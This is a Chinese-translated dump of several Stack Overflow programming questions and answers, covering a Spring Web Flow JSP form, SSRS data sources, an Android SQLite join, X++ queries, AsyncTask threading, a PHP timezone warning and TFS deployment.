<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt"%>
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>

<script type="text/javascript"
    src="<c:url value="/resources/dojo/dojo.js" />">

</script>
<script type="text/javascript"
    src="<c:url value="/resources/spring/Spring.js" />">

</script>
<script type="text/javascript"
    src="<c:url value="/resources/spring/Spring-Dojo.js" />">

</script>

<link type="text/css" rel="stylesheet"
    href="<c:url value="/resources/dijit/themes/claro/claro.css" />" />
<html>
<head>
<title>Spring 3.0 MVC - Web Flow Example</title>
</head>
<body class="claro">
    <h2>Customer Registration</h2>

    <form:form commandName="customer">
        <input type="hidden" name="_flowExecutionKey"
            value="${flowExecutionKey}" />
        <div id="container">
            <table>
                <tr>
                    <td><b>Active</n></td>
                    <td ><form:radiobutton tabIndex="1" value="A" path="type" /></td>
                </tr>
                <tr>
                    <td ><b>Retired</b></td>
                    <td ><form:radiobutton tabIndex="2" value="R" path="type" /></td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="name" /></font><b>Name:
                    </b></td>
                    <td><form:input path="name" class="value" /> <script
                            type="text/javascript">
                        Spring.addDecoration(new Spring.ElementDecoration({
                            elementId : "name",
                            widgetType : "dijit.form.ValidationTextBox",
                            widgetAttrs : {
                                promptMessage : "Enter Name",
                                required : true
                            }
                        }));
                    </script> <br />
                        <p></td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="phoneNumber" /></font>

                        <b>Phone number: </b></td>
                    <td>
                        <div class="span-7 last">
                            <form:input path="phoneNumber" />
                        </div> <script type="text/javascript">
                            Spring
                                    .addDecoration(new Spring.ElementDecoration(
                                            {
                                                elementId : "phoneNumber",
                                                widgetType : "dijit.form.ValidationTextBox",
                                                widgetAttrs : {
                                                    required : true,
                                                    invalidMessage : "A 16-digit credit card number is required.",
                                                    regExp : "[0-9]{16}"
                                                }
                                            }));
                        </script> <br />
                    </td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="address" /></font> <b>Address:
                    </b></td>
                    <td><form:input path="address" /> <script
                            type="text/javascript">
                        Spring.addDecoration(new Spring.ElementDecoration({
                            elementId : "address",
                            widgetType : "dijit.form.ValidationTextBox",
                            widgetAttrs : {
                                promptMessage : "Enter Address",
                                required : true
                            }
                        }));
                    </script> <br /></td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="city" /></font> <b>City:
                    </b></td>
                    <td><form:input path="city" /> <script type="text/javascript">
                        Spring.addDecoration(new Spring.ElementDecoration({
                            elementId : "city",
                            widgetType : "dijit.form.ValidationTextBox",
                            widgetAttrs : {
                                promptMessage : "Enter City",
                                required : true
                            }
                        }));
                    </script> <br /></td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="state" /></font> <b>State:
                    </b></td>
                    <td><form:input path="state" /> <script
                            type="text/javascript">
                        Spring.addDecoration(new Spring.ElementDecoration({
                            elementId : "state",
                            widgetType : "dijit.form.ValidationTextBox",
                            widgetAttrs : {
                                promptMessage : "Enter State",
                                required : true
                            }
                        }));
                    </script> <br /></td>
                </tr>
                <tr>
                    <td><font color=red><form:errors path="zipCode" /></font> <b>Zip
                            Code: </b></td>
                    <td><form:input path="zipCode" /> <script
                            type="text/javascript">
                        Spring.addDecoration(new Spring.ElementDecoration({
                            elementId : "zipCode",
                            widgetType : "dijit.form.ValidationTextBox",
                            widgetAttrs : {
                                promptMessage : "Enter Zip Code",
                                required : true
                            }
                        }));
                    </script> <br /></td>
                </tr>
            </table>
        </div>

        <input type="submit" name="_eventId_submit" id="submit" value="Submit" />
        <input type="submit" name="_eventId_cancel" value="Cancel" />
        <script type="text/javascript">
            Spring.addDecoration(new Spring.ValidateAllDecoration({
                elementId : 'submit',
                event : 'onclick'
            }));
        </script>
    </form:form>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:44:31.670

您可以在[这里查看](http://dojotoolkit.org/reference-guide/1.8/dijit/form/Form.html#using-native-form-elements)该示例完全符合您的要求！

[编辑] 看到[这篇文章](https://stackoverflow.com/questions/12840143/how-to-check-field-sizes-and-make-radiobutton-required-with-spring-spring-js-an/12842340#12842340)

# amazon-ec2 - 停止亚马逊 ec2 linux 实例时执行脚本

> ID：12839369
> 
> 赞同：2
> 
> 时间：2012-10-11T12:19:14.163
> 
> 标签：amazon-ec2

我试图在从亚马逊网络控制台停止 EC2 linux 实例时执行一个 shell 脚本。但它没有执行。

任何人都可以尽早帮助我，如何在停止实例的同时执行脚本。

提前致谢。

问候， Krishna Bhaskar。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T07:52:00.713

> 我试图在从亚马逊网络控制台停止 EC2 linux 实例时执行一个 shell 脚本。但它没有执行。

也许它没有执行，因为您正在停止实例。这是最明显的预期行为。

您能否提供更多关于您对实例所做的工作以使其能够工作的详细信息？

# reporting-services - SQL Server Reporting Services (SSRS) 动态数据源

> ID：12839370
> 
> 赞同：1
> 
> 时间：2012-10-11T12:19:18.800
> 
> 标签：reporting-services

我是 SSRS 的新用户。我学会了基本的东西，并且能够使用 VS 2008 和 BIDS 制作报告。但我不能更进一步。我想使用动态数据源。我的问题是：

1.  首先，用户应输入四个凭据：a）服务器名称 b）数据库名称 c）用户 ID 4）密码。这将有助于建立与数据库的连接并建立数据源。凭据应存储在会话或 cookie 中。

2.  现在用户将能够在不提供凭证的情况下查看所有报告，因为他/她已经提供了它们。

我创建了一个动态数据源，但每次打开报告时都会要求提供凭据。

任何演示项目或文章都将受到高度赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:47:47.520

听起来单独的 SSRS 无法完成您想要的。SSRS 不会为最终用户创建新数据源或更改现有数据源提供良好的接口。有一些潜在的解决方法可以获得您想要的一些功能，例如更改服务器的方法，位于：http: [//blog.softartisans.com/2011/04/19/how-to-create-a-dynamic-报告服务共享数据源使用链接服务器](http://blog.softartisans.com/2011/04/19/how-to-create-a-dynamic-reporting-services-shared-data-source-using-linked-servers/) （需要使用链接服务器的能力。）

但要管理用户会话或 cookie，您需要的不仅仅是 SSRS。最简单的方法是使用 .NET 网站来管理凭据。它可能能够使用 ReportViewer 控件或其他访问 SSRS 的方法（例如 URL 访问）来获取报告功能。

# ios - 将来自 tableView 中的自定义单元格的详细信息传递给 detailView

> ID：12839375
> 
> 赞同：0
> 
> 时间：2012-10-11T12:19:31.703
> 
> 标签：ios, xcode, uitableview, custom-cell, detailview

新手问题。是的，我已经查看了所有内容，但没有找到一个很好的解释来说明如何处理这个特定的实例。我确定这很简单，但我遇到了麻烦。如果您可以花 5 分钟时间查看代码并帮助我理解，那就太好了。

好的，我有一个名为 •cell 的自定义单元格，我给出了“MyCell”的标识符。这充满了细节并且工作正常。问题是当我尝试将其传递给详细视图时。我正在努力理解传递它的最佳方法，特别是如何从我的自定义单元格的一部分获取文本并在 detailView 中复制它 - 文本标签是否意味着在自定义单元格中被称为与它相同是在detailView还是别的什么？我知道我需要在我的 didSelectRowAtIndexPath 中添加一些东西，但我不确定如何构建它。

我的 detailViewController 被称为 detailViewController 并在标识符中给出了身份 detailViewController

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    // I've called this •cell but my custom cell is called MyCell in the identifier - I'm not sure if this makes a difference?
    UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];

     //then I craete my detailViewController 
```

UIViewController *detailViewController = [[UIViewController alloc] initWithNibName:@"detailViewController" bundle:nil]; // ...

```
 //I think I understand this bit - detailTitle is the name I have given to the text label in the detail view and venueHeader is the name of the corresponding label in the custom cell - I want the detailTitle to = venueHeader

    detailViewController.detailTitle = CustomCell.venueHeader.text;

     // I have created a segue in storyboards so I don't know if I need this bit of code as well?

     [self.navigationController pushViewController:detailViewController animated:YES];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-15T09:47:51.013

你可以使用这个代码

```
 UIStoryboard *storyBoard=[UIStoryboard storyboardWithName:@"Main" bundle:nil];
DetailViewController *pvc=[storyBoard instantiateViewControllerWithIdentifier:@"DetailViewController"];
pvc.dict = [arrData objectAtIndex:indexPath.row];
 pvc.upload  = [arrData1 objectAtIndex:indexPath.row]; 
```

[self.navigationController pushViewController:pvc 动画:YES];

比在目标视图控制器中打印字典后获取数据

# android - 找出sqlite android查询的麻烦

> ID：12839376
> 
> 赞同：3
> 
> 时间：2012-10-11T12:19:33.023
> 
> 标签：android, database, sqlite

我在弄清楚我应该如何进行数据库查询以使光标选择正确的信息时遇到了一些麻烦。

我的数据库结构如下：http: [//i.stack.imgur.com/vPaoD.png](http://i.stack.imgur.com/vPaoD.png)（无法嵌入图像，因为缺少代表）

Feed 与 user 是多对多的关系，而 Item 与 user 是一对多的关系。

我想创建一个方法，该方法使用名为 getUsers(Feed feed) 的方法返回特定提要中的所有用户或项目。

我的数据库代码是： public class DatabaseHelper extends SQLiteOpenHelper {

```
// Database static variables
private static final int DATABASE_VERSION = 1;
private static final String DATABASE_NAME = "feedlrDatabase";

// Declaring feed table
private static final String TABLE_FEED = "feed";
private static final String FEED_COLUMN_ID = "_id";
private static final String FEED_COLUMN_NAME = "name";

// Declaring feed-user bridge table
private static final String TABLE_FEEDUSER = "feeduser";
private static final String FEEDUSER_COLUMN_FEED_ID = "feed_ID";
private static final String FEEDUSER_COLUMN_USER_ID = "user_ID";

// Declaring user table
private static final String TABLE_USER = "user";
private static final String USER_COLUMN_ID = "_id";
public static final String USER_COLUMN_USERNAME = "username";
private static final String USER_COLUMN_USERID = "userid";
private static final String USER_COLUMN_IMGURL = "ProfileImageURL";
private static final String USER_COLUMN_SOURCE = "source";

// Declaring item table
private static final String TABLE_ITEM = "item";
public static final String ITEM_COLUMN_ID = "_id";
public static final String ITEM_COLUMN_TEXT = "text";
private static final String ITEM_COLUMN_TIMESTAMP = "timestamp";
private static final String ITEM_COLUMN_TYPE = "type";
private static final String ITEM_COLUMN_URL = "URL";
private static final String ITEM_COLUMN_IMGURL = "imgURL";
private static final String ITEM_COLUMN_USER_ID = "user_ID";

private SQLiteDatabase db = this.getWritableDatabase();

public DatabaseHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
}

public void onCreate(SQLiteDatabase database) {
    // @formatter:off
    // Creating feed table
    database.execSQL("CREATE TABLE " + TABLE_FEED + "(" + FEED_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + FEED_COLUMN_NAME
            + " TEXT UNIQUE" + ")");

    // Creating feed-user bridge table
    database.execSQL("CREATE TABLE " + TABLE_FEEDUSER + "("
            + FEEDUSER_COLUMN_FEED_ID + " INT NOT NULL,"
            + FEEDUSER_COLUMN_USER_ID + " INT NOT NULL" + ")");

    // Creating user table
    // TODO Should username be the unique idenifier of a user?!
    database.execSQL("CREATE TABLE " + TABLE_USER + "(" + USER_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + USER_COLUMN_USERNAME
            + " TEXT NOT NULL," + USER_COLUMN_USERID + " TEXT UNIQUE,"
            + USER_COLUMN_IMGURL + " TEXT," + USER_COLUMN_SOURCE
            + " TEXT NOT NULL" + ")");

    // Creating item table
    database.execSQL("CREATE TABLE " + TABLE_ITEM + "(" + ITEM_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + ITEM_COLUMN_TEXT
            + " TEXT," + ITEM_COLUMN_TIMESTAMP + " TEXT,"
            + ITEM_COLUMN_TYPE + " TEXT," + ITEM_COLUMN_URL + " TEXT,"
            + ITEM_COLUMN_IMGURL + " TEXT," + ITEM_COLUMN_USER_ID
            + " INT NOT NULL" + ")");
    // @formatter:on
}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    // Temporarily drops all tables
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_FEED);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_FEEDUSER);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_USER);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_ITEM);
    onCreate(db);
}

public void addFeed(Feed feed) {

    ContentValues temp = new ContentValues();

    temp.put(FEED_COLUMN_NAME, feed.getTitle());
    try {
        db.insertOrThrow(TABLE_FEED, null, temp);
    } catch (SQLiteConstraintException e) {
        Log.d("ERROR", "Inserted feed is not UNIQUE!");
        // TODO Apply listener to notify the user that the feed name already
        // exists!
    }

    // db.close();
}

public void removeFeed(Feed feed) {
    String title = feed.getTitle();
    long id = getFeedID(feed);

    removeFeedBridge(id);

    db.delete(TABLE_FEED, FEED_COLUMN_NAME + "=?", new String[] { title });
}

public ArrayList<String> listFeeds() {
    final ArrayList<String> feeds = new ArrayList<String>();

    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_FEED, null);
    while (c.moveToNext()) {
        String s = c.getString(1);
        feeds.add(s);
    }
    c.close();
    return feeds;
}

public long getFeedID(Feed feed) {
    String feedTitle = feed.getTitle();
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor c = db.query(TABLE_FEED, new String[] { FEED_COLUMN_ID },
            FEED_COLUMN_NAME + "=?", new String[] { feedTitle }, null,
            null, null);
    c.moveToNext();
    Long id = Long.parseLong(c.getString(0));
    c.close();
    return id;
}

public long getUserID(User user) {
    long id = user.getId();
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor c = db.query(TABLE_USER, new String[] { USER_COLUMN_ID },
            USER_COLUMN_ID + "=?", new String[] { id + "" }, null, null,
            null);
    c.moveToNext();
    Long id1 = Long.parseLong(c.getString(0));
    c.close();
    return id1;
}

public ArrayList<String> listUsers() {
    final ArrayList<String> users = new ArrayList<String>();

    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_USER, null);

    while (c.moveToNext()) {
        String s = c.getString(1);
        users.add(s);
    }
    return users;
}

public void addUserToFeed(User user, Feed feed) {
    long FeedID = getFeedID(feed);
    long UserID = addUser(user);

    // Add bridge connection
    if (UserID != -1) {
        addFeedUserBridge(FeedID, UserID);
    }
}

public long addUser(User user) {
    // TODO Check if the user already exists!!

    ContentValues temp = new ContentValues();

    temp.put(USER_COLUMN_USERNAME, user.getUserName());
    temp.put(USER_COLUMN_USERID, user.getId());
    temp.put(USER_COLUMN_IMGURL, user.getProfileImageURL());
    // TODO implement source on user?

    long userID = db.insert(TABLE_USER, null, temp);
    return userID;
}

public void addFeedUserBridge(long feedID, long userID) {

    ContentValues temp = new ContentValues();

    temp.put(FEEDUSER_COLUMN_FEED_ID, feedID);
    temp.put(FEEDUSER_COLUMN_USER_ID, userID);

    db.insert(TABLE_FEEDUSER, null, temp);
}

public void removeUserFromFeed(Feed feed, User user) {
    long feedID = getFeedID(feed);
    long userID = getUserID(user);

    removeFeedUserBridge(feedID, userID);
}

private void removeUser(User user) {

    long id = user.getId();
    db.delete(TABLE_USER, USER_COLUMN_ID + "=?", new String[] { id + "" });
}

private void removeFeedUserBridge(long feedID, long userID) {

    db.delete(TABLE_FEEDUSER, FEEDUSER_COLUMN_FEED_ID + "=?" + " and "
            + FEEDUSER_COLUMN_USER_ID + "=?", new String[] { feedID + "",
            userID + "" });
}

public ArrayList<String> listFeedUser() {
    final ArrayList<String> feeduser = new ArrayList<String>();

    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_FEEDUSER, null);
    while (c.moveToNext()) {
        feeduser.add(c.getString(0) + " " + c.getString(1));
    }
    c.close();
    return feeduser;
}

private void removeFeedBridge(Long id) {

    db.delete(TABLE_FEEDUSER, FEEDUSER_COLUMN_FEED_ID + "=?",
            new String[] { id + "" });
}

public void updateUser(long userID) {
    // TODO implement this method
}

public void addListOfItems(List<? extends Item> itemList) {

    db.beginTransaction();
    for (Item i : itemList) {

        ContentValues temp = new ContentValues();
        temp.put(ITEM_COLUMN_TEXT, i.getText());
        temp.put(ITEM_COLUMN_TIMESTAMP, i.getTimestamp());
        temp.put(ITEM_COLUMN_TYPE, i.getText());
        temp.put(ITEM_COLUMN_URL, i.getURL());
        temp.put(ITEM_COLUMN_IMGURL, i.getIMGURL());
        temp.put(ITEM_COLUMN_USER_ID, i.getUser().getId());
        db.insert(TABLE_ITEM, null, temp);

    }
    db.setTransactionSuccessful();
    db.endTransaction();
    // db.close();
}

public Cursor getAllItems() {

    Cursor c = db.query(TABLE_ITEM, new String[] { ITEM_COLUMN_ID,
            ITEM_COLUMN_TEXT, ITEM_COLUMN_TIMESTAMP, ITEM_COLUMN_TYPE,
            ITEM_COLUMN_URL, ITEM_COLUMN_IMGURL, ITEM_COLUMN_USER_ID },
            null, null, null, null, null);
    // db.close();
    return c;
}

public long getItemTableSize() {
    SQLiteDatabase database = this.getReadableDatabase();
    long l = DatabaseUtils.queryNumEntries(database, TABLE_ITEM);
    // database.close();
    return l;
}

public void clearItemTable() {
    SQLiteDatabase db = getWritableDatabase();
    db.delete(TABLE_ITEM, null, null);
}

public void addUsers(List<? extends User> users) {

    db.beginTransaction();

    for (User u : users) {
        ContentValues temp = new ContentValues();
        temp.put(USER_COLUMN_USERNAME, u.getUserName());
        db.insert(TABLE_USER, null, temp);
    }
    db.setTransactionSuccessful();
    db.endTransaction();
}

public Cursor getAllUsers() {

    Cursor c = db.query(TABLE_USER, new String[] { USER_COLUMN_ID,
            USER_COLUMN_USERNAME }, null, null, null, null, null);
    return c;
}

public Cursor getUsers(Feed feed) {

    return null;
} 
```

}

我试图在网上搜索有关如何“动态”查询的信息，但没有找到任何东西。：/

我的猜测是：Cursor c = db.rawQuery("SELECT * FROM Item WHERE userID = (some argument to select all users from FeedUser table)");

任何人都知道有关如何进行此类查询的任何有用链接？

最好的问候拉瓦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:15:49.043

您可以使用这样的查询：

```
SELECT *
FROM Item
WHERE userID IN (SELECT userID
                 FROM FeedUser
                 WHERE feedID = ?) 
```

但是加入会更有效：

```
SELECT Item.field1, Item.field2, ...
FROM Item JOIN FeedUser
  ON Item.userID = FeedUser.userID 
```

# x++ - 高级查询范围

> ID：12839383
> 
> 赞同：6
> 
> 时间：2012-10-11T12:19:47.313
> 
> 标签：x++, axapta

如何使用高级过滤（使用 x++）在 Ax 中进行查询：

我想在 SalesTable 表单上显示这样的过滤条件`SalesTable.SalesId == "001" || SalesLine.LineAmount == 100`。

所以结果应该显示 SalesOrder 001 和其他至少有一个 SalesLine 且 LineAmount = 100 的 salesOrders？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-11T16:31:08.203

如果销售订单“001”只有在具有销售行的情况下才应被选中，Jan 的解决方案就可以正常工作。如果它没有行，它将不会出现在输出中。

如果销售订单“001”应该始终出现在输出中对您很重要，即使它没有销售行，您可以通过联合执行如下操作：

```
static void AdvancedFiltering(Args _args)
{
    Query q;
    QueryRun qr;
    QueryBuildDataSource qbds;
    SalesTable salesTable;
    ;

    q = new Query();
    q.queryType(QueryType::Union);

    qbds = q.addDataSource(tablenum(SalesTable), identifierstr(SalesTable_1));
    qbds.fields().dynamic(false);
    qbds.fields().clearFieldList();
    qbds.fields().addField(fieldnum(SalesTable, SalesId));
    qbds.addRange(fieldnum(SalesTable, SalesId)).value(queryValue('001'));

    qbds = q.addDataSource(tablenum(SalesTable), identifierstr(SalesTable_2), UnionType::Union);
    qbds.fields().dynamic(false);
    qbds.fields().clearFieldList();
    qbds.fields().addField(fieldnum(SalesTable, SalesId));

    qbds = qbds.addDataSource(tablenum(SalesLine));
    qbds.relations(true);
    qbds.joinMode(JoinMode::ExistsJoin);
    qbds.addRange(fieldnum(SalesLine, LineAmount )).value(queryValue(100));

    qr = new QueryRun(q);

    while (qr.next())
    {
        salesTable = qr.get(tablenum(SalesTable));
        info(salesTable.SalesId);
    }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-11T13:48:35.050

AX[选择](http://msdn.microsoft.com/en-us/library/aa656402.aspx)语句支持存在连接，例如：

```
 while select salesTable
     exits join salesLine
     where salesLine.SalesId == salesTable.SalesId &&
           salesLine.LineAmount == 100 
```

X++ 不支持`exists`将子句作为子句中的子查询`where`。因此，无法表达与`exists`结合`or`。

但是 AX 支持[查询中的查询表达式](http://www.axaptapedia.com/index.php?title=Expressions_in_query_ranges)。

因此，您的查询应该可以这样表达：

```
static void TestQuery(Args _args)
{
    SalesTable st;
    QueryRun qr = new QueryRun(new Query());
    QueryBuildDataSource qst = qr.query().addDataSource(tableNum(SalesTable));
    QueryBuildDataSource qsl = qst.addDataSource(tableNum(SalesLine));
    str qstr = strFmt('((%1.SalesId == "%2") || (%3.LineAmount == %4))',
                      qst.name(), queryValue("001"),
                      qsl.name(), queryValue(100));
    qsl.relations(true);  // Link on SalesId
    qsl.joinMode(JoinMode::ExistsJoin);
    qsl.addRange(fieldNum(SalesLine,RecId)).value(qstr);
    info(qstr);           // This is the query expression
    info(qst.toString()); // This is the full query
    while (qr.next())
    {
        st = qr.get(tableNum(SalesTable));
        info(st.SalesId);
    }
} 
```

但是，如果销售订单 001 不包含行，则不会被选中。除此之外，输出是您要求的：

> ((SalesTable_1.SalesId == "001") || (SalesLine_1.LineAmount == 100))
> 
> SELECT FIRSTFAST * FROM SalesTable EXISTS JOIN FIRSTFAST * FROM SalesLine WHERE SalesTable.SalesId = SalesLine.SalesId AND ((((SalesTable_1.SalesId == "001") || (SalesLine_1.LineAmount == 100))))
> 
> 001
> 
> 125
> 
> 175

# android - Android平板电脑中未调用Asynctask DoInBackground（）

> ID：12839384
> 
> 赞同：6
> 
> 时间：2012-10-11T12:19:50.773
> 
> 标签：android, android-asynctask

在android中的应用程序上工作我使用了Asynctask类，当我在运行2.3.5的Android设备上测试时工作正常，但我面临的问题是，同样不适用于我的平板电脑4.0.4

在测试时，知道正在调用 prexecute() 但未调用 doInbackground()，但是在设备 (2.3.5) 上调用了 doInbackground()。

我相信这个问题的原因之一是平板电脑的处理器比设备的处理器快得多，所以可能是一些线程问题，为什么，为了解决这个问题，我使用了一些标志，并使用了 Thread.sleep()在 do while 循环中，当条件为真时，它可以工作，但没有运气，我被困在循环本身中。这是我的代码：

```
MyAsyncTask object = new MyAsyncTask (MainActivity.this);
runOnUiThread(new Runnable() {
    public void run() {         

        try {
            if (object.isReady() || !object.isStarting()) {
                return;
            }

            object.execute();

            do {
                Thread.sleep(1000);             
            } while (!object.isReady() && object.isStarting());

            if(!object.isReady()) { 
                return;
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }           
}); 
```

异步任务类：

```
public class MyAsyncTask extends AsyncTask<Void, Void, Boolean>{

    private ProgressDialog dialog;
    private Context context;
    private boolean isStarting = false;
    private boolean isReady = false;

    public AsyncUpdatesofJquery(Context context) {
        this.context = context;
        isStarting = true;
        isReady = false;
    }

    public boolean isStarting() {
        return isStarting;
    }

    public boolean isReady() {
        return isReady;
    }

    @Override
    protected void onPreExecute() {

        isStarting = true;
        isReady = false;
        dialog = new ProgressDialog(context); 
        dialog.setMessage("Downloading Files, Please wait...");
        dialog.show();
    }

    @Override
    protected Boolean doInBackground(Void... params) {

        isReady = true;
        isStarting = false;
        downloadFiles(context); // my background task

        return true;
    }

    @Override
    protected void onPostExecute(Boolean result) {
        super.onPostExecute(result);
        context.startActivity(new Intent(context, NewActivity.class));
        dialog.dismiss();
        isReady = false;
        isStarting = false;

    }
} 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-12T19:03:44.353

多线程模型在 2.3.5 和 4.0.4 之间发生了变化。 `AsyncTask`现在默认让应用程序中的所有子类使用同一个线程（即一次只能运行一个 AsyncTask！）。它在[这里](http://developer.android.com/reference/android/os/AsyncTask.html)解释：

> 首次引入时，AsyncTask 在单个后台线程上串行执行。从 DONUT 开始，这被更改为允许多个任务并行运行的线程池。从 HONEYCOMB 开始，任务在单个线程上执行，以避免并行执行导致的常见应用程序错误。
> 
> 如果你真的想要并行执行，你可以使用 THREAD_POOL_EXECUTOR 调用 executeOnExecutor(java.util.concurrent.Executor, Object[])。

考虑到这一点，您的应用程序中可能正在运行另一个`AsyncTask`，从而阻止了这个应用程序的启动。这可以解释为什么它在您的 2.3.5 设备上运行良好，但在您的 4.0.4 平板电脑上运行良好。

# php - 修复在 Linux 上运行的 PHP 中的时间格式警告

> ID：12839386
> 
> 赞同：1
> 
> 时间：2012-10-11T12:20:00.713
> 
> 标签：php, linux, timezone, symfony-1.4

> **可能重复：**
> [PHP - 依赖系统的时区设置是不安全的](https://stackoverflow.com/questions/6032660/php-it-is-not-safe-to-rely-on-the-systems-timezone-settings)

我在 symfony 1.4/propel 1.4 中有一个现有项目。它在生产服务器（RedHat）和我的本地开发环境（Windows 7 上的 WAMP 服务器）上运行良好。

我正在设置一个新的扩展服务器，在 OpenSuse 12.1 上运行，用于通过 Intranet 进行本地办公室测试。

一切都很好，但我在 HTML 页面上收到以下警告

```
Warning: date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'Asia/Calcutta' for 'IST/5.0/no DST' instead in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfRootConfigHandler.class.php on line 91

Warning: date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'Asia/Calcutta' for 'IST/5.0/no DST' instead in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfDefineEnvironmentConfigHandler.class.php on line 66

Warning: date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'Asia/Calcutta' for 'IST/5.0/no DST' instead in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfDefineEnvironmentConfigHandler.class.php on line 66

Warning: session_start() [function.session-start]: Cannot send session cache limiter - headers already sent (output started at /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfRootConfigHandler.class.php:91) in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/storage/sfSessionStorage.class.php on line 93

Warning: session_regenerate_id() [function.session-regenerate-id]: Cannot regenerate session id - headers already sent in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/storage/sfSessionStorage.class.php on line 171

Warning: Cannot modify header information - headers already sent by (output started at /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfRootConfigHandler.class.php:91) in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/response/sfWebResponse.class.php on line 336

Warning: Cannot modify header information - headers already sent by (output started at /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/config/sfRootConfigHandler.class.php:91) in /home/admin/svntestco/troupasvn/trunk/lib/vendor/symfony/lib/response/sfWebResponse.class.php on line 357 
```

我知道问题出在某些时区设置上，但我不知道如何解决。我试图找出正在使用的 php.ini 文件，但无法通过 Yast 安装 php。有人可以提供文件名（可能是 php.ini）、它在 opensuse 上的位置以及修复该问题所需的更改。

请注意，我们使用的是 nginx，而不是 apache。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:26:01.580

对于 Symfony，你应该看到你已经安装了**php_intl**扩展。我有问题。

第二个是你应该在你的**php.ini**文件中设置你的时区。

**php.ini**：

```
[Date]
; Defines the default timezone used by the date functions
date.timezone = Europe/Berlin 
```

例如。

# asp.net-mvc - TFS 和 MVC 项目的最佳实践 - 仅部署更改

> ID：12839405
> 
> 赞同：0
> 
> 时间：2012-10-11T12:20:47.333
> 
> 标签：asp.net-mvc, deployment, tfs, incremental-build

我为一家公司管理了几个网站，他们希望我过渡到 TFS。作为他们政策的一部分，我只能部署自上次部署以来已更改的文件。即，如果视图已更改，则将其部署，如果未更改，则它不是部署包的一部分。他们使用自动化工具进行部署。

目前，我使用自己编写的自定义工具连接到我的本地源提供程序 (Vault Pro) 并查找给定日期的所有更改并将这些文件复制到 zip 文件中。

如何使用 Team Foundation Server 完成类似的任务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:57:29.227

TFS 为您提供了一个[`SDK`](http://archive.msdn.microsoft.com/TfsSdk)可用于从代码中查询它的方法。这是[`client API`](http://msdn.microsoft.com/en-us/library/bb130146%28v=vs.100%29.aspx).

# android - 如何从url在gridview中显示图像

> ID：12839406
> 
> 赞同：0
> 
> 时间：2012-10-11T12:20:51.000
> 
> 标签：android

嗨，当我尝试使用此代码从 gridview 中的 imageurl 中复制图像时，它显示空指针异常，任何人都可以帮助我：我的代码是

```
public class Gridview extends Activity {

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_gridview);

    GridView gridview = (GridView) findViewById(R.id.gridview);   
    gridview.setAdapter(new ImageAdapter(this));
   }
public class ImageAdapter extends BaseAdapter{

    private Context mContext;
    private Integer[] mThumbIds;
    public ImageAdapter(Context c)
    {
        mContext = c;     
    }
public int getCount() {
    return mThumbIds.length;
}
public Object getItem(int position) {
    return position;
}
public long getItemId(int position) {
    return position;
}
public View getView(int position, View convertView, ViewGroup parent) {
    ImageView imageView;
    if (convertView == null) {
        imageView = new ImageView(mContext);
        imageView.setLayoutParams(new GridView.LayoutParams(45, 45));
        imageView.setAdjustViewBounds(false);
        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        imageView.setPadding(8, 8, 8, 8);
    } else {
        imageView = (ImageView) convertView;
    }
    imageView
